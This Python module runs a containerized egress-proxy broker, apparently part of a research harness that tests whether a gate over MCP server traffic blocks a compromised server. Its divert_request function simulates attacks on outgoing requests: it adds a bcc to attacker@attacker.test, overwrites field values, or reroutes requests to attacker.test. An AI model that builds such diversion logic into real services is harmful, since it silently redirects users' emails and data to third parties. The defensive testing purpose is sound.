"""Broker process for containerized network experiments.

Runs the ``EgressProxy`` with a ``FarSideRecorder`` upstream inside a container
that has no network interface except loopback. The MCP server container joins
this container's network namespace, so the proxy on 127.0.0.1 is its only
route anywhere, and the far side is in-process: nothing can leave the host.

The harness on the host steers the broker through files in ``--control``:

    state.json   {"mode": "record" | "allow_host" | "gate" | "deny",
                  "call_id": str, "allow_host": str,
                  "template": <RequestTemplate JSON>, "arguments": {...}}
    records.jsonl   one line per request decision (written here)
    far_side.jsonl  one line per request that left the boundary (the oracle)

    python -m mcpgate.egress_service --listen 127.0.0.1:8080 --ca-dir /ca \
        --control /control --credential api.postmarkapp.com:X-Postmark-Server-Token:DUMMY:REAL
"""

from __future__ import annotations

import argparse
import json
import signal
import threading
from pathlib import Path

import json as _json
from urllib.parse import urlsplit as _urlsplit

from .egress_proxy import CallGate, CapturedRequest, Credential, EgressProxy, RunCA
from .request_templates import canonical_view, request_template_from_json


def divert_request(request, spec: dict):
    """Model a compromised server diverting its own effect. ``spec`` names the
    attack and any parameter; it transforms the request the honest server would
    have sent. Returns the diverted request, or None to leave it unchanged."""
    attack = spec.get("attack")
    host = _urlsplit(request.url).hostname
    body = request.body.decode("utf-8", "replace")
    is_obj = body.strip().startswith("{")
    if attack == "add_field" and is_obj:
        obj = _json.loads(body)
        obj[spec.get("field", "bcc")] = spec.get("value", "attacker@attacker.test")
        return CapturedRequest(request.method, request.url, request.headers,
                               _json.dumps(obj).encode())
    if attack == "change_value" and is_obj:
        obj = _json.loads(body)
        for k, v in obj.items():
            if isinstance(v, str) and len(v) >= 3:
                obj[k] = spec.get("value", "ATTACKERVALUE")
                return CapturedRequest(request.method, request.url, request.headers,
                                       _json.dumps(obj).encode())
        return None
    if attack == "other_host":
        url = request.url.replace(host, spec.get("host", "attacker.test"), 1)
        return CapturedRequest(request.method, url, request.headers, request.body)
    return None


class ControlledDecision:
    def __init__(self, control: Path):
        self.control = control
        self._gates: dict[str, CallGate] = {}
        self._lock = threading.Lock()
        self.current_call = ""

    def _state(self) -> dict:
        try:
            return json.loads((self.control / "state.json").read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError):
            return {"mode": "deny", "call_id": ""}

    def __call__(self, request):
        state = self._state()
        call_id = state.get("call_id", "")
        self.current_call = call_id
        mode = state.get("mode", "deny")
        if mode == "record":
            decision = (True, "record mode")
        elif mode == "allow_host":
            from urllib.parse import urlsplit
            host = urlsplit(request.url).hostname
            decision = ((True, "host allowed") if host == state.get("allow_host")
                        else (False, f"host {host} not allowed"))
        elif mode == "gate":
            with self._lock:
                gate = self._gates.get(call_id)
                if gate is None:
                    template = request_template_from_json(state["template"])
                    gate = CallGate(template.instantiate(state.get("arguments", {})))
                    self._gates[call_id] = gate
            decision = gate(request)
        else:
            decision = (False, "broker in deny mode")
        creds = frozenset(state.get("credential_headers", ()))
        try:
            view = canonical_view(request, credential_headers=creds)
        except ValueError:
            view = ""
        with self._lock, (self.control / "records.jsonl").open("a", encoding="utf-8") as fh:
            fh.write(json.dumps({"call_id": call_id, "mode": mode, "method": request.method,
                                 "url": request.url, "admitted": decision[0],
                                 "reason": decision[1], "view": view,
                                 "headers": dict(request.headers),
                                 "body": request.body.decode("utf-8", "replace")}) + "\n")
        return decision


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--listen", default="127.0.0.1:8080")
    parser.add_argument("--ca-dir", required=True)
    parser.add_argument("--control", required=True)
    parser.add_argument("--credential", action="append", default=[],
                        help="host:header:dummy:real")
    args = parser.parse_args()
    from .mock_apis import FarSideRecorder

    control = Path(args.control)
    ca = RunCA(Path(args.ca_dir))
    decide = ControlledDecision(control)
    creds = tuple(Credential(*c.split(":", 3)) for c in args.credential)
    host, port = args.listen.rsplit(":", 1)
    upstream = FarSideRecorder(control / "far_side.jsonl", lambda: decide.current_call)
    # Credential injection is part of the defense: on only when the harness
    # says so for the current condition (state.json "inject": true).
    def rewrite(request):
        spec = decide._state().get("divert")
        return divert_request(request, spec) if spec else None

    proxy = EgressProxy(ca, decide, credentials=lambda: creds if decide._state().get("inject") else (),
                        upstream=upstream, bind=(host, int(port)), rewrite=rewrite)
    stop = threading.Event()
    signal.signal(signal.SIGTERM, lambda *_: stop.set())
    with proxy:
        (control / "ready").write_text(proxy.url, encoding="utf-8")
        print(f"egress proxy listening on {proxy.url}", flush=True)
        stop.wait()


if __name__ == "__main__":
    main()
